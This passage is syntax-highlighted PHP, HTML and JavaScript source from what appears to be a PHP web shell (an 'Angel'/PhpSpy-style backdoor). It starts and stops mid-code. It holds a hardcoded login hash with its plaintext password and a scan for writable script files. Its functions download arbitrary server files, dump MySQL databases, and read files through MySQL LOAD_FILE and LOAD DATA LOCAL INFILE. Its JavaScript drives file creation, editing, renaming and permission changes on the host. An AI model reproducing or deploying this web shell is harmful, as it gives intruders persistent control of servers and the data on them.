<span style="color: #969896; background-color: #1d1f21;"> </span>   if (IS_GPC) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $value = s_array($value);
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   $$key = $value;
}
/*===================== &#31243;&#24207;&#37197;&#32622; =====================*/

//echo encode_pass('angel');exit;
//angel = ec38fe2a8497e0a8d6d349b3533038cb
// &#22914;&#26524;&#38656;&#35201;&#23494;&#30721;&#39564;&#35777;,&#35831;&#20462;&#25913;&#30331;&#38470;&#23494;&#30721;,&#30041;&#31354;&#20026;&#19981;&#38656;&#35201;&#39564;&#35777;
$pass  = 'ec38fe2a8497e0a8d6d349b3533038cb'; //angel

//&#22914;&#24744;&#23545; cookie &#20316;&#29992;&#33539;&#22260;&#26377;&#29305;&#27530;&#35201;&#27714;, &#25110;&#30331;&#24405;&#19981;&#27491;&#24120;, &#35831;&#20462;&#25913;&#19979;&#38754;&#21464;&#37327;, &#21542;&#21017;&#35831;&#20445;&#25345;&#40664;&#35748;
// cookie &#21069;&#32512;
$cookiepre = '';
// cookie &#20316;&#29992;&#22495;
$cookiedomain = '';
// cookie &#20316;&#29992;&#36335;&#24452;
$cookiepath = '/';
// cookie &#26377;&#25928;&#26399;
$cookielife = 86400;

//&#31243;&#24207;&#25628;&#32034;&#21487;&#20889;&#25991;&#20214;&#30340;&#31867;&#22411;
!$writabledb &amp;&amp; $writabledb = 'php,cgi,pl,asp,inc,js,html,htm,jsp';
/*===================== &#37197;&#32622;&#32467;&#26463; =====================*/

$charsetdb = array('','armscii8','ascii','big5','binary','cp1250','cp1251','cp12<span style="text-decoration: underline;">56','cp1257','cp850','cp852','cp866','cp932','dec8','euc-jp','euc-kr','gb2312','gbk','geostd8','greek','hebrew','hp8','keybcs2','koi8r','koi8u','latin1','latin2','latin5','latin7','macce','macroman','sjis','swe7','tis620','ucs2','ujis','utf8');</span>
if ($charset == 'utf8') {
<span style="color: #969896; background-color: #1d1f21;"> </span>   header("content-Type: text/html; charset=utf-8");
} elseif ($charset == 'big5') {
<span style="color: #969896; background-color: #1d1f21;"> </span>   header("content-Type: text/html; charset=big5");
} elseif ($charset == 'gbk') {
<span style="color: #969896; background-color: #1d1f21;"> </span>   header("content-Type: text/html; charset=gbk");
} elseif ($charset == 'latin1') {
<span style="color: #969896; background-color: #1d1f21;"> </span>   header("content-Type: text/html; charset=iso-8859-2");
} elseif ($charset == 'euc-kr') {
<span style="color: #969896; background-color: #1d1f21;"> </span>   header("content-Type: text/html; charset=euc-kr");
} elseif ($charset == 'euc-jp') {
<span style="color: #969896; background-color: #1d1f21;"> </span>   header("content-Type: text/html; charset=euc-jp");
}

$self = $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];
$timestamp = time();

/*===================== &#36523;&#20221;&#39564;&#35777; =====================*/
if ($action == "logout") {
<span style="color: #969896; background-color: #1d1f21;"> </span>   scookie('loginpass', '', -86400 * 365);
<span style="color: #969896; background-color: #1d1f21;"> </span>   @header('Location: '.$self);
<span style="color: #969896; background-color: #1d1f21;"> </span>   exit;
}
if($pass) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   if ($action == 'login') {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if ($pass == encode_pass($password)) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   scookie('loginpass',encode_pass($password));
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   @header('Location: '.$self);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   exit;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   if ($_COOKIE['loginpass']) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if ($_COOKIE['loginpass'] != $pass) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   loginpage();
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   } else {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   loginpage();
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
}
/*===================== &#39564;&#35777;&#32467;&#26463; =====================*/

$errmsg = '';
!$action &amp;&amp; $action = 'file';

// &#26597;&#30475;PHPINFO
if ($action == 'phpinfo') {
<span style="color: #969896; background-color: #1d1f21;"> </span>   if (IS_PHPINFO) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   phpinfo();
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   exit;
<span style="color: #969896; background-color: #1d1f21;"> </span>   } else {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $errmsg = 'phpinfo() function has non-permissible';
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
}

// &#19979;&#36733;&#25991;&#20214;
if ($doing == 'downfile' &amp;&amp; $thefile) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   if (!@file_exists($thefile)) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $errmsg = 'The file you want Downloadable was nonexistent';
<span style="color: #969896; background-color: #1d1f21;"> </span>   } else {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $fileinfo = pathinfo($thefile);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   header('Content-type: application/x-'.$fileinfo['extension']);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   header('Content-Disposition: attachment; filename='.$fileinfo['basename'<span style="text-decoration: underline;">]);</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   header('Content-Length: '.filesize($thefile));
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   @readfile($thefile);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   exit;
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
}

// &#30452;&#25509;&#19979;&#36733;&#22791;&#20221;&#25968;&#25454;&#24211;
if ($doing == 'backupmysql' &amp;&amp; !$saveasfile) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   if (!$table) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $errmsg ='Please choose the table';
<span style="color: #969896; background-color: #1d1f21;"> </span>   } else {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbp<span style="text-decoration: underline;">ort);</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $filename = basename($dbname.'.sql');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   header('Content-type: application/unknown');
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   header('Content-Disposition: attachment; filename='.$filename);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   foreach($table as $k =&gt; $v) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if ($v) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   sqldumptable($v);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   mysql_close();
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   exit;
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
}

// &#36890;&#36807;MYSQL&#19979;&#36733;&#25991;&#20214;
if($doing=='mysqldown'){
<span style="color: #969896; background-color: #1d1f21;"> </span>   if (!$dbname) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $errmsg = 'Please input dbname';
<span style="color: #969896; background-color: #1d1f21;"> </span>   } else {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbp<span style="text-decoration: underline;">ort);</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if (!file_exists($mysqldlfile)) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $errmsg = 'The file you want Downloadable was nonexistent';
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   } else {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $result = q("select load_file('$mysqldlfile');");
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if(!$result){
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   q("DROP TABLE IF EXISTS tmp_angel;");
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   q("CREATE TABLE tmp_angel (content LONGBLOB NOT NULL);");
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   //&#29992;&#26102;&#38388;&#25139;&#26469;&#34920;&#31034;&#25130;&#26029;,&#36991;&#20813;&#20986;&#29616;&#35835;&#21462;&#33258;&#36523;&#25110;&#21253;&#21547;__angel_1111111111_eof__&#30340;&#25991;&#20214;&#26102;&#19981;&#23436;&#25972;&#30340;&#24773;&#20917;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   q("LOAD DATA LOCAL INFILE '".addslashes($mysqldlfile)."' INTO TA<span style="text-decoration: underline;">BLE tmp_angel FIELDS TERMINATED BY '__angel_{$timestamp}_eof__' ESCAPED BY '' LINES TERMINATED BY '__angel_{$timestamp}_eof__';");</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $result = q("select content from tmp_angel");
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   q("DROP TABLE tmp_angel");
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $row = @mysql_fetch_array($result);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   if (!$row) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $errmsg = 'Load file failed '.mysql_error();
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   } else {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $fileinfo = pathinfo($mysqldlfile);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   header('Content-type: application/x-'.$fileinfo['extension']);
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   header('Content-Disposition: attachment; filename='.$fileinfo['b<span style="text-decoration: underline;">asename']);</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   header("Accept-Length: ".strlen($row[0]));
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   echo $row[0];
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   exit;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
}

?&gt;
&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv="Content-Type" content="text/html; charset=gbk"&gt;
&lt;title&gt;&lt;?php echo $action.' - '.$_SERVER['HTTP_HOST'];?&gt;&lt;/title&gt;
&lt;style type="text/css"&gt;
<span style="color: #b5bd68;">body</span>,<span style="color: #b5bd68;">td</span>{<span style="color: #f0c674;">font:</span> 12px Arial,Tahoma;<span style="color: #f0c674;">line-height:</span> 16px;}
<span style="color: #b5bd68;">.input</span>{<span style="color: #f0c674;">font:</span>12px Arial,Tahoma;<span style="color: #f0c674;">background:</span><span style="color: #000000; background-color: #fff;">#fff</span>;<span style="color: #f0c674;">border:</span> 1px solid <span style="color: #ffffff; background-color: #666;">#666</span>;<span style="color: #f0c674;">padding:</span>2px<span style="text-decoration: underline;">;</span><span style="color: #f0c674; text-decoration: underline;">height:</span><span style="text-decoration: underline;">22px;}</span>
<span style="color: #b5bd68;">.area</span>{<span style="color: #f0c674;">font:</span>12px 'Courier New', Monospace;<span style="color: #f0c674;">background:</span><span style="color: #000000; background-color: #fff;">#fff</span>;<span style="color: #f0c674;">border:</span> 1px solid <span style="color: #ffffff; background-color: #666;">#666</span>;<span style="color: #f0c674; text-decoration: underline;">padding:</span><span style="text-decoration: underline;">2px;}</span>
<span style="color: #b5bd68;">.bt </span>{<span style="color: #f0c674;">border-color:</span><span style="color: #000000; background-color: #b0b0b0;">#b0b0b0</span>;<span style="color: #f0c674;">background:</span><span style="color: #ffffff; background-color: #3d3d3d;">#3d3d3d</span> <span style="color: #b294bb;">url</span>(<span style="color: #f0c674;">http:</span>//t.cn/zRymOgc);<span style="color: #f0c674;">color:</span><span style="color: #000000; background-color: #ffffff;">#fff</span><span style="color: #000000; background-color: #ffffff; text-decoration: underline;">fff</span><span style="text-decoration: underline;">;</span><span style="color: #f0c674; text-decoration: underline;">font:</span><span style="text-decoration: underline;">12px Arial,Tahoma;</span><span style="color: #f0c674; text-decoration: underline;">height:</span><span style="text-decoration: underline;">22px;}</span>
<span style="color: #b5bd68;">a </span>{<span style="color: #f0c674;">color:</span> <span style="color: #ffffff; background-color: #00f;">#00f</span>;<span style="color: #f0c674;">text-decoration:</span>underline;}
<span style="color: #b5bd68;">a</span><span style="color: #b294bb;">:hover</span>{<span style="color: #f0c674;">color:</span> <span style="color: #ffffff; background-color: #f00;">#f00</span>;<span style="color: #f0c674;">text-decoration:</span>none;}
<span style="color: #b5bd68;">.alt1 td</span>{<span style="color: #f0c674;">border-top:</span>1px solid <span style="color: #000000; background-color: #fff;">#fff</span>;<span style="color: #f0c674;">border-bottom:</span>1px solid <span style="color: #000000; background-color: #ddd;">#ddd</span>;<span style="color: #f0c674;">background:</span><span style="color: #000000; background-color: #f1f1f1;">#f1f1</span><span style="color: #000000; background-color: #f1f1f1; text-decoration: underline;">f1</span><span style="text-decoration: underline;">;</span><span style="color: #f0c674; text-decoration: underline;">padding:</span><span style="text-decoration: underline;">5px 15px 5px 5px;}</span>
<span style="color: #b5bd68;">.alt2 td</span>{<span style="color: #f0c674;">border-top:</span>1px solid <span style="color: #000000; background-color: #fff;">#fff</span>;<span style="color: #f0c674;">border-bottom:</span>1px solid <span style="color: #000000; background-color: #ddd;">#ddd</span>;<span style="color: #f0c674;">background:</span><span style="color: #000000; background-color: #f9f9f9;">#f9f9</span><span style="color: #000000; background-color: #f9f9f9; text-decoration: underline;">f9</span><span style="text-decoration: underline;">;</span><span style="color: #f0c674; text-decoration: underline;">padding:</span><span style="text-decoration: underline;">5px 15px 5px 5px;}</span>
<span style="color: #b5bd68;">.focus td</span>{<span style="color: #f0c674;">border-top:</span>1px solid <span style="color: #000000; background-color: #fff;">#fff</span>;<span style="color: #f0c674;">border-bottom:</span>1px solid <span style="color: #000000; background-color: #ddd;">#ddd</span>;<span style="color: #f0c674;">background:</span><span style="color: #000000; background-color: #ffffaa;">#fff</span><span style="color: #000000; background-color: #ffffaa; text-decoration: underline;">faa</span><span style="text-decoration: underline;">;</span><span style="color: #f0c674; text-decoration: underline;">padding:</span><span style="text-decoration: underline;">5px 15px 5px 5px;}</span>
<span style="color: #b5bd68;">.head td</span>{<span style="color: #f0c674;">border-top:</span>1px solid <span style="color: #000000; background-color: #fff;">#fff</span>;<span style="color: #f0c674;">border-bottom:</span>1px solid <span style="color: #000000; background-color: #ddd;">#ddd</span>;<span style="color: #f0c674;">background:</span><span style="color: #000000; background-color: #e9e9e9;">#e9e9</span><span style="color: #000000; background-color: #e9e9e9; text-decoration: underline;">e9</span><span style="text-decoration: underline;">;</span><span style="color: #f0c674; text-decoration: underline;">padding:</span><span style="text-decoration: underline;">5px 15px 5px 5px;</span><span style="color: #f0c674; text-decoration: underline;">font-weight:</span><span style="text-decoration: underline;">bold;}</span>
<span style="color: #b5bd68;">.head td span</span>{<span style="color: #f0c674;">font-weight:</span>normal;}
<span style="color: #b5bd68;">.infolist </span>{<span style="color: #f0c674;">padding:</span>10px;<span style="color: #f0c674;">margin:</span>10px 0 20px 0;<span style="color: #f0c674;">background:</span><span style="color: #000000; background-color: #F1F1F1;">#F1F1F1</span>;<span style="color: #f0c674;">border:</span>1px solid<span style="text-decoration: underline;"> </span><span style="color: #000000; background-color: #ddd; text-decoration: underline;">#ddd</span><span style="text-decoration: underline;">;}</span>
<span style="color: #b5bd68;">form</span>{<span style="color: #f0c674;">margin:</span>0;<span style="color: #f0c674;">padding:</span>0;}
<span style="color: #b5bd68;">h2</span>{<span style="color: #f0c674;">margin:</span>0;<span style="color: #f0c674;">padding:</span>0;<span style="color: #f0c674;">height:</span>24px;<span style="color: #f0c674;">line-height:</span>24px;<span style="color: #f0c674;">font-size:</span>14px;<span style="color: #f0c674;">color:</span><span style="color: #ffffff; background-color: #5B686F;">#5B686F</span>;<span style="text-decoration: underline;">}</span>
<span style="color: #b5bd68;">ul.info li</span>{<span style="color: #f0c674;">margin:</span>0;<span style="color: #f0c674;">color:</span><span style="color: #ffffff; background-color: #444;">#444</span>;<span style="color: #f0c674;">line-height:</span>24px;<span style="color: #f0c674;">height:</span>24px;}
<span style="color: #b5bd68;">u</span>{<span style="color: #f0c674;">text-decoration:</span> none;<span style="color: #f0c674;">color:</span><span style="color: #ffffff; background-color: #777;">#777</span>;<span style="color: #f0c674;">float:</span>left;<span style="color: #f0c674;">display:</span>block;<span style="color: #f0c674;">width:</span>150px;<span style="color: #f0c674;">margin-r</span><span style="color: #f0c674; text-decoration: underline;">ight:</span><span style="text-decoration: underline;">10px;}</span>
<span style="color: #b5bd68;">.drives</span>{<span style="color: #f0c674;">padding:</span>5px;}
<span style="color: #b5bd68;">.drives span </span>{<span style="color: #f0c674;">margin:</span>auto 7px;}
&lt;/style&gt;
&lt;script type="text/javascript"&gt;
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">CheckAll</span>(form) {
<span style="color: #969896; background-color: #1d1f21;"> </span>  <span style="color: #b5bd68;"> for(var</span> <span style="color: #f0c674;">i</span>=0;i&lt;form.elements.length;i++) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>  <span style="color: #b5bd68;"> var</span> <span style="color: #f0c674;">e</span> = form.elements[i];
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>  <span style="color: #b5bd68;"> if</span> (e.name != 'chkall')
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   e.checked = form.chkall.checked;
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
}
<span style="color: #b5bd68;">function</span> $(id) {
<span style="color: #969896; background-color: #1d1f21;"> </span>  <span style="color: #b5bd68;"> return</span> document.<span style="color: #de935f;">getElementById</span>(id);
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">createdir</span>(){
<span style="color: #969896; background-color: #1d1f21;"> </span>  <span style="color: #b5bd68;"> var</span> <span style="color: #f0c674;">newdirname</span>;
<span style="color: #969896; background-color: #1d1f21;"> </span>   newdirname = <span style="color: #de935f;">prompt</span>('Please input the directory name:', ''  );
<span style="color: #969896; background-color: #1d1f21;"> </span>  <span style="color: #b5bd68;"> if</span> (!newdirname)<span style="color: #b5bd68;"> return</span>;
<span style="color: #969896; background-color: #1d1f21;"> </span>   $('createdir').newdirname.value=newdirname;
<span style="color: #969896; background-color: #1d1f21;"> </span>   $('createdir').<span style="color: #de935f;">submit</span>();
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">fileperm</span>(pfile){
<span style="color: #969896; background-color: #1d1f21;"> </span>  <span style="color: #b5bd68;"> var</span> <span style="color: #f0c674;">newperm</span>;
<span style="color: #969896; background-color: #1d1f21;"> </span>   newperm = <span style="color: #de935f;">prompt</span>('Current file:'+pfile+'\nPlease input new attribute:', '');
<span style="color: #969896; background-color: #1d1f21;"> </span>  <span style="color: #b5bd68;"> if</span> (!newperm)<span style="color: #b5bd68;"> return</span>;
<span style="color: #969896; background-color: #1d1f21;"> </span>   $('fileperm').newperm.value=newperm;
<span style="color: #969896; background-color: #1d1f21;"> </span>   $('fileperm').pfile.value=pfile;
<span style="color: #969896; background-color: #1d1f21;"> </span>   $('fileperm').<span style="color: #de935f;">submit</span>();
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">copyfile</span>(sname){
<span style="color: #969896; background-color: #1d1f21;"> </span>  <span style="color: #b5bd68;"> var</span> <span style="color: #f0c674;">tofile</span>;
<span style="color: #969896; background-color: #1d1f21;"> </span>   tofile = <span style="color: #de935f;">prompt</span>('Original file:'+sname+'\nPlease input object file (fullpath<span style="text-decoration: underline;">):', '');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>  <span style="color: #b5bd68;"> if</span> (!tofile)<span style="color: #b5bd68;"> return</span>;
<span style="color: #969896; background-color: #1d1f21;"> </span>   $('copyfile').tofile.value=tofile;
<span style="color: #969896; background-color: #1d1f21;"> </span>   $('copyfile').sname.value=sname;
<span style="color: #969896; background-color: #1d1f21;"> </span>   $('copyfile').<span style="color: #de935f;">submit</span>();
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">rename</span>(oldname){
<span style="color: #969896; background-color: #1d1f21;"> </span>  <span style="color: #b5bd68;"> var</span> <span style="color: #f0c674;">newfilename</span>;
<span style="color: #969896; background-color: #1d1f21;"> </span>   newfilename = <span style="color: #de935f;">prompt</span>('Former file name:'+oldname+'\nPlease input new filenam<span style="text-decoration: underline;">e:', '');</span>
<span style="color: #969896; background-color: #1d1f21;"> </span>  <span style="color: #b5bd68;"> if</span> (!newfilename)<span style="color: #b5bd68;"> return</span>;
<span style="color: #969896; background-color: #1d1f21;"> </span>   $('rename').newfilename.value=newfilename;
<span style="color: #969896; background-color: #1d1f21;"> </span>   $('rename').oldname.value=oldname;
<span style="color: #969896; background-color: #1d1f21;"> </span>   $('rename').<span style="color: #de935f;">submit</span>();
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">dofile</span>(doing,thefile,m){
<span style="color: #969896; background-color: #1d1f21;"> </span>  <span style="color: #b5bd68;"> if</span> (m &amp;&amp; !<span style="color: #de935f;">confirm</span>(m)) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>  <span style="color: #b5bd68;"> return</span>;
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   $('filelist').doing.value=doing;
<span style="color: #969896; background-color: #1d1f21;"> </span>  <span style="color: #b5bd68;"> if</span> (thefile){
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $('filelist').thefile.value=thefile;
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   $('filelist').<span style="color: #de935f;">submit</span>();
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">createfile</span>(nowpath){
<span style="color: #969896; background-color: #1d1f21;"> </span>  <span style="color: #b5bd68;"> var</span> <span style="color: #f0c674;">filename</span>;
<span style="color: #969896; background-color: #1d1f21;"> </span>   filename = <span style="color: #de935f;">prompt</span>('Please input the file name:', '');
<span style="color: #969896; background-color: #1d1f21;"> </span>  <span style="color: #b5bd68;"> if</span> (!filename)<span style="color: #b5bd68;"> return</span>;
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #de935f;">opfile</span>('editfile',nowpath + filename,nowpath);
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">opfile</span>(action,opfile,dir){
<span style="color: #969896; background-color: #1d1f21;"> </span>   $('fileopform').action.value=action;
<span style="color: #969896; background-color: #1d1f21;"> </span>   $('fileopform').opfile.value=opfile;
<span style="color: #969896; background-color: #1d1f21;"> </span>   $('fileopform').dir.value=dir;
<span style="color: #969896; background-color: #1d1f21;"> </span>   $('fileopform').<span style="color: #de935f;">submit</span>();
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">godir</span>(dir,view_writable){
<span style="color: #969896; background-color: #1d1f21;"> </span>  <span style="color: #b5bd68;"> if</span> (view_writable) {
<span style="color: #969896; background-color: #1d1f21;"> </span>   <span style="color: #969896; background-color: #1d1f21;"> </span>   $('godir').view_writable.value=view_writable;
<span style="color: #969896; background-color: #1d1f21;"> </span>   }
<span style="color: #969896; background-color: #1d1f21;"> </span>   $('godir').dir.value=dir;
<span style="color: #969896; background-color: #1d1f21;"> </span>   $('godir').<span style="color: #de935f;">submit</span>();
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">getsize</span>(getdir,dir){
<span style="color: #969896; background-color: #1d1f21;"> </span>   $('getsize').getdir.value=getdir;
<span style="color: #969896; background-color: #1d1f21;"> </span>   $('getsize').dir.value=dir;
<span style="color: #969896; background-color: #1d1f21;"> </span>   $('getsize').<span style="color: #de935f;">submit</span>();
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">editrecord</span>(action, base64, tablename){
